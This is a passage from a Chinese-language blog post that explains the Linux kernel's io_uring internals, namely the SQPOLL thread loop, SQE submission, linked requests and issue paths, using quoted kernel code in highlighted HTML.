class="keyword">if</span> (unlikely(ret2 == -EBADR))</span><br><span class="line">clear_bit(IO_CHECK_CQ_DROPPED_BIT,</span><br><span class="line">  &amp;ctx-&gt;check_cq);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果请求获取完成事件<ul><li>如果开启了syscall轮询模式,执行iopoll逻辑</li><li>否则执行等待完成事件逻辑</li></ul></li></ul><h2 id="kernel-2">kernel</h2><p>最后是io_uring 内核的任务处理, 在这里先给出一个流程图, 然后再具体分析各个函数</p><p><img src="/images/io_uring.png" alt="io_uring"></p><p>图来自 <a href="https://zhuanlan.zhihu.com/p/380726590">https://zhuanlan.zhihu.com/p/380726590</a> , 侵删//</p><h3 id="io-sq-thread-内核任务提交机制"><code>io_sq_thread</code> | 内核任务提交机制</h3><p>io_sq_thread是 <code>SQPOLL</code> 模式下内核任务轮询线程.<br>首先设置线程环境</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_sq_thread</span><span class="params">(<span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_sq_data</span> *<span class="title">sqd</span> =</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> timeout = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> buf[TASK_COMM_LEN];</span><br><span class="line">DEFINE_WAIT(wait);</span><br><span class="line"></span><br><span class="line"><span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">&quot;iou-sqp-%d&quot;</span>, sqd-&gt;task_pid);</span><br><span class="line">set_task_comm(current, buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* reset to our pid after we&#x27;ve set task_comm, for fdinfo */</span></span><br><span class="line">sqd-&gt;task_pid = current-&gt;pid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sqd-&gt;sq_cpu != <span class="number">-1</span>) &#123;</span><br><span class="line">set_cpus_allowed_ptr(current, cpumask_of(sqd-&gt;sq_cpu));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">set_cpus_allowed_ptr(current, cpu_online_mask);</span><br><span class="line">sqd-&gt;sq_cpu = raw_smp_processor_id();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来获取锁并进入无限循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mutex_lock(&amp;sqd-&gt;lock);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br></pre></td></tr></table></figure><p>设置好timeout</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (io_sqd_events_pending(sqd) || signal_pending(current)) &#123;</span><br><span class="line"><span class="keyword">if</span> (io_sqd_handle_event(sqd))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">timeout = jiffies + sqd-&gt;sq_thread_idle;</span><br><span class="line"><span class="comment">// sq_thread_idle 来自用户在 params 设置的时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到这个线程创建在内存分配好之后， 即，即使是第一次进入此线程， 如果 sqes对应内存有任务，也会处理任务， 意味着在 <code>io_uring_setup</code> 之前，在sqes写好的任务，也可以被处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">cap_entries = !list_is_singular(&amp;sqd-&gt;ctx_list);</span><br><span class="line"><span class="comment">// 获取是否有多个io_ring的标记cap_entries</span></span><br><span class="line">list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list) &#123;</span><br><span class="line"><span class="comment">// 遍历注册的io_ring,调用__io_sq_thread做实际的轮询操作</span></span><br><span class="line"><span class="type">int</span> ret = __io_sq_thread(ctx, cap_entries);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sqt_spin &amp;&amp; (ret &gt; <span class="number">0</span> || !wq_list_empty(&amp;ctx-&gt;iopoll_list)))</span><br><span class="line">sqt_spin = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//  如果有事件处理或iopoll任务,则设置sqt_spin标记</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (io_run_task_work())</span><br><span class="line"><span class="comment">// 调用io_run_task_work处理排队的工作任务</span></span><br><span class="line">sqt_spin = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sqt_spin || !time_after(jiffies, timeout)) &#123;</span><br><span class="line"><span class="comment">// 如果有待处理事件或时间没超时</span></span><br><span class="line"><span class="keyword">if</span> (sqt_spin)</span><br><span class="line">timeout = jiffies + sqd-&gt;sq_thread_idle;</span><br><span class="line"><span class="comment">// 如果有待处理事件,更新下一次超时时间</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(need_resched())) &#123;</span><br><span class="line"><span class="comment">// 检查是否需要调度,如果需要,主动释放并重新获取锁</span></span><br><span class="line">mutex_unlock(&amp;sqd-&gt;lock);</span><br><span class="line">cond_resched();</span><br><span class="line">mutex_lock(&amp;sqd-&gt;lock);</span><br><span class="line">sqd-&gt;sq_cpu = raw_smp_processor_id();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">// 没超时就直接continue， 因为之后就是判断是否需要阻塞</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来实现io_uring SQ线程的阻塞和唤醒逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">prepare_to_wait(&amp;sqd-&gt;wait, &amp;wait, TASK_INTERRUPTIBLE);</span><br><span class="line"><span class="comment">// 将当前线程设置为可中断状态TASK_INTERRUPTIBLE</span></span><br><span class="line"><span class="keyword">if</span> (!io_sqd_events_pending(sqd) &amp;&amp; !task_work_pending(current)) &#123;</span><br><span class="line"><span class="type">bool</span> needs_sched = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">// 检查是否有待处理事件和任务</span></span><br><span class="line"></span><br><span class="line">list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list) &#123;</span><br><span class="line"><span class="comment">// 若没有则遍历所有注册的io_ring</span></span><br><span class="line">atomic_or(IORING_SQ_NEED_WAKEUP,</span><br><span class="line">&amp;ctx-&gt;rings-&gt;sq_flags);</span><br><span class="line"><span class="comment">// 设置IORING_SQ_NEED_WAKEUP标志</span></span><br><span class="line"><span class="keyword">if</span> ((ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp;</span><br><span class="line">    !wq_list_empty(&amp;ctx-&gt;iopoll_list)) &#123;</span><br><span class="line">    <span class="comment">// 检查iopoll和SQ队列是否为空</span></span><br><span class="line">needs_sched = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ensure the store of the wakeup flag is not</span></span><br><span class="line"><span class="comment"> * reordered with the load of the SQ tail</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">smp_mb__after_atomic();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (io_sqring_entries(ctx)) &#123;</span><br><span class="line">needs_sched = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (needs_sched) &#123;</span><br><span class="line"><span class="comment">// 如果需要调度</span></span><br><span class="line">mutex_unlock(&amp;sqd-&gt;lock);</span><br><span class="line"><span class="comment">// 释放锁调度</span></span><br><span class="line">schedule();</span><br><span class="line">mutex_lock(&amp;sqd-&gt;lock);</span><br><span class="line"><span class="comment">// 唤醒后重新获取锁和CPU信息</span></span><br><span class="line">sqd-&gt;sq_cpu = raw_smp_processor_id();</span><br><span class="line">&#125;</span><br><span class="line">list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list)</span><br><span class="line"><span class="type">atomic_andnot</span>(IORING_SQ_NEED_WAKEUP,</span><br><span class="line">&amp;ctx-&gt;rings-&gt;sq_flags);</span><br><span class="line"><span class="comment">// 否则清除唤醒标记</span></span><br><span class="line">&#125;</span><br><span class="line">finish_wait(&amp;sqd-&gt;wait, &amp;wait);</span><br><span class="line">timeout = jiffies + sqd-&gt;sq_thread_idle;</span><br><span class="line"><span class="comment">// 更新等待时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是退出无限循环时的清理机制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io_uring_cancel_generic(<span class="literal">true</span>, sqd);</span><br><span class="line">sqd-&gt;thread = <span class="literal">NULL</span>;</span><br><span class="line">list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list)</span><br><span class="line">atomic_or(IORING_SQ_NEED_WAKEUP, &amp;ctx-&gt;rings-&gt;sq_flags);</span><br><span class="line">io_run_task_work();</span><br><span class="line">mutex_unlock(&amp;sqd-&gt;lock);</span><br><span class="line"></span><br><span class="line">complete(&amp;sqd-&gt;exited);</span><br><span class="line">do_exit(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h4 id="io-sq-thread"><code>__io_sq_thread</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_sq_thread(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">bool</span> cap_entries)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> to_submit;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">to_submit = io_sqring_entries(ctx);</span><br><span class="line"><span class="comment">/* if we&#x27;re handling multiple rings, cap submit size for fairness */</span></span><br><span class="line"><span class="keyword">if</span> (cap_entries &amp;&amp; to_submit &gt; IORING_SQPOLL_CAP_ENTRIES_VALUE)</span><br><span class="line">to_submit = IORING_SQPOLL_CAP_ENTRIES_VALUE;</span><br><span class="line"><span class="comment">// 计算需要提交的任务数量</span></span><br><span class="line"><span class="comment">// 如果需要公平,则 cap 为固定最大值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!wq_list_empty(&amp;ctx-&gt;iopoll_list) || to_submit) &#123;</span><br><span class="line"><span class="comment">// 如果有 iopoll 任务或可提交请求</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">creds</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;sq_creds != current_cred())</span><br><span class="line">creds = override_creds(ctx-&gt;sq_creds);</span><br><span class="line"><span class="comment">// 保存和恢复 creds 身份信息避免安全漏洞</span></span><br><span class="line">mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line"><span class="comment">// 上锁保护关键区</span></span><br><span class="line"><span class="keyword">if</span> (!wq_list_empty(&amp;ctx-&gt;iopoll_list))</span><br><span class="line">io_do_iopoll(ctx, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 处理 iopoll 轮询事件</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Don&#x27;t submit if refs are dying, good for io_uring_register(),</span></span><br><span class="line"><span class="comment"> * but also it is relied upon by io_ring_exit_work()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (to_submit &amp;&amp; likely(!percpu_ref_is_dying(&amp;ctx-&gt;refs)) &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED))</span><br><span class="line">ret = io_submit_sqes(ctx, to_submit);</span><br><span class="line"><span class="comment">// 提交请求到 SQ 环</span></span><br><span class="line">mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (to_submit &amp;&amp; wq_has_sleeper(&amp;ctx-&gt;sqo_sq_wait))</span><br><span class="line">wake_up(&amp;ctx-&gt;sqo_sq_wait);</span><br><span class="line"><span class="comment">// 唤醒 sqo_sq 等待线程</span></span><br><span class="line"><span class="keyword">if</span> (creds)</span><br><span class="line">revert_creds(creds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>io_sqring_entries</code>  逻辑如下</p><p>所以内核在SQPOLL 模式下判断是否有任务需要执行，就是看 tail 是否更新</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">io_sqring_entries</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rings</span> *<span class="title">rings</span> =</span> ctx-&gt;rings;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> entries;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* make sure SQ entry isn&#x27;t read before tail */</span></span><br><span class="line">entries = smp_load_acquire(&amp;rings-&gt;sq.tail) - ctx-&gt;cached_sq_head;</span><br><span class="line"><span class="keyword">return</span> min(entries, ctx-&gt;sq_entries);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-submit-sqes"><code>io_submit_sqes</code></h4><p>最后是真正的提交请求函数</p><p>计算需要提交的sqes并跟踪状态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_submit_sqes</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">unsigned</span> <span class="type">int</span> nr)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> entries = io_sqring_entries(ctx);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> left;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!entries))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* make sure SQ entry isn&#x27;t read before tail */</span></span><br><span class="line">ret = left = min(nr, entries);</span><br><span class="line">io_get_task_refs(left);</span><br><span class="line">io_submit_state_start(&amp;ctx-&gt;submit_state, left);</span><br></pre></td></tr></table></figure><p>循环处理每个sqes</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">req</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!io_alloc_req(ctx, &amp;req)))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!io_get_sqe(ctx, &amp;sqe))) &#123;</span><br><span class="line">io_req_add_to_cache(req, ctx);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 为每个SQE分配并初始化io_kiocb请求 </span></span><br><span class="line"><span class="keyword">if</span> (unlikely(io_submit_sqe(ctx, req, sqe)) &amp;&amp;</span><br><span class="line"><span class="comment">// 真正的提交</span></span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_SUBMIT_ALL)) &#123;</span><br><span class="line">left--;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (--left);</span><br></pre></td></tr></table></figure><h4 id="io-submit-sqe"><code>io_submit_sqe</code></h4><p>这个函数比较关键的是对于同步的处理, 我们知道, <code>io_uring</code>  是异步的, 任务处理的顺序不一定是按照提交的顺序, 但是,  如果 sqe 的 flag字段设置了  <code>IOSQE_IO_LINK</code> , 那么任务就会挂在一条链上, 直到一个任务没有此flag, 而链上的任务的执行是有先后顺序</p><p>同时, 要理解, <code>ctx-&gt;sumit_state.link</code> 是一个循环链表, 由 <code>io_kiocb</code>  组成, 每个 <code>io_kiocb</code>  的link成员指向下一个 <code>io_kiocb</code>  结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">io_submit_sqe</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="keyword">struct</span> io_kiocb *req, <span class="type">const</span> <span class="keyword">struct</span> io_uring_sqe *sqe)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_submit_link</span> *<span class="title">link</span> =</span> &amp;ctx-&gt;submit_state.link;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = io_init_req(ctx, req, sqe);</span><br><span class="line"><span class="comment">// 初始化并校验SQE请求req </span></span><br><span class="line"><span class="keyword">if</span> (unlikely(ret))</span><br><span class="line"><span class="keyword">return</span> io_submit_fail_init(sqe, req, ret);</span><br><span class="line"><span class="comment">// 如果已有链头或者SQE标记了链接标志</span></span><br><span class="line"></span><br><span class="line">trace_io_uring_submit_req(req);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we already have a head request, queue this one for async</span></span><br><span class="line"><span class="comment"> * submittal once the head completes. If we don&#x27;t have a head but</span></span><br><span class="line"><span class="comment"> * IOSQE_IO_LINK is set in the sqe, start a new head. This one will be</span></span><br><span class="line"><span class="comment"> * submitted sync once the chain is complete. If none of those</span></span><br><span class="line"><span class="comment"> * conditions are true (normal request), then just queue it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(link-&gt;head)) &#123;</span><br><span class="line"><span class="comment">// 如果链表已经有了一个head 请求, 意味着之前sqe 有 `IOSQE_IO_LINK` 标志</span></span><br><span class="line">ret = io_req_prep_async(req);</span><br><span class="line"><span class="comment">// 准备异步提交状态</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(ret))</span><br><span class="line"><span class="keyword">return</span> io_submit_fail_init(sqe, req, ret);</span><br><span class="line"></span><br><span class="line">trace_io_uring_link(req, link-&gt;head);</span><br><span class="line">link-&gt;last-&gt;link = req;</span><br><span class="line">link-&gt;last = req;</span><br><span class="line"><span class="comment">// 将本项挂载到链表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 如果此项没有 LINK 标志, 清空 链表</span></span><br><span class="line"><span class="comment">/* last request of the link, flush it */</span></span><br><span class="line">req = link-&gt;head;</span><br><span class="line">link-&gt;head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; (REQ_F_FORCE_ASYNC | REQ_F_FAIL))</span><br><span class="line"><span class="keyword">goto</span> fallback;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely(req-&gt;flags &amp; (IO_REQ_LINK_FLAGS |</span><br><span class="line">  REQ_F_FORCE_ASYNC | REQ_F_FAIL))) &#123;</span><br><span class="line"><span class="comment">// 如果之前的任务没有LINK 标记, 但此任务有, 给链表添加一个头</span></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS) &#123;</span><br><span class="line">link-&gt;head = req;</span><br><span class="line">link-&gt;last = req;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fallback:  </span><br><span class="line"><span class="comment">// 加入降级提交fallback队列</span></span><br><span class="line">io_queue_sqe_fallback(req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 加入普通提交队列</span></span><br><span class="line">io_queue_sqe(req);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-queue-sqe-io-issue-sqe-重要"><code>io_queue_sqe</code> | <code>io_issue_sqe</code> | 重要</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">io_queue_sqe</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = io_issue_sqe(req, IO_URING_F_NONBLOCK|IO_URING_F_COMPLETE_DEFER);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We async punt it if the file wasn&#x27;t marked NOWAIT, or if the file</span></span><br><span class="line"><span class="comment"> * doesn&#x27;t support non-blocking read/write attempts</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (likely(!ret))</span><br><span class="line">io_arm_ltimeout(req);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">io_queue_async(req, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_issue_sqe</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req, <span class="type">unsigned</span> <span class="type">int</span> issue_flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_issue_def</span> *<span class="title">def</span> =</span> &amp;io_issue_defs[req-&gt;opcode];</span><br><span class="line"><span class="comment">// 根据op_code 查看请求def</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">creds</span> =</span> <span 